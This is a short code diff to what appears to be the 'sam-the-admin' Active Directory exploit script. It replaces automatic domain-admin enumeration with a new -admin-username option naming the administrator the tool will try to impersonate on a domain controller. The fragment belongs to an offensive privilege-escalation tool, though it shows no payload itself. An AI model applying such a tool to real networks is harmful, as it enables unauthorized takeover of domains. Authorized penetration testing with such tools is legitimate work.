@@ -59,9 +59,14 @@ def samtheadmin(options):
     dc_host = dcinfo['name'][0].lower()
     dcfull = dcinfo['dNSHostName'][0].lower()
     logging.info(f'Selected Target {dcfull}')
-    domainAdmins = get_domain_admins(ldap_session, domain_dumper)
-    random_domain_admin = random.choice(domainAdmins)
-    logging.info(f'Total Domain Admins {len(domainAdmins)}')
+
+    # Commented because it doesn't work
+    #domainAdmins = get_domain_admins(ldap_session, domain_dumper)
+    #print(domainAdmins)
+    #random_domain_admin = random.choice(domainAdmins)
+
+    random_domain_admin = options.admin_username
+    #logging.info(f'Total Domain Admins {len(domainAdmins)}')
     logging.info(f'will try to impersonate {random_domain_admin}')
 
     # udata = get_user_info(username, ldap_session, domain_dumper)
@@ -179,6 +184,7 @@ if __name__ == '__main__':
     group.add_argument('-dc-ip', action='store', metavar="ip",
                        help='IP of the domain controller to use. Useful if you can\'t translate the FQDN.'
                        'specified in the account parameter will be used')
+    group.add_argument('-admin-username', action='store', help='Username of the admin if you know it.')
     parser.add_argument('-use-ldaps', action='store_true', help='Use LDAPS instead of LDAP')
 
     if len(sys.argv)==1:
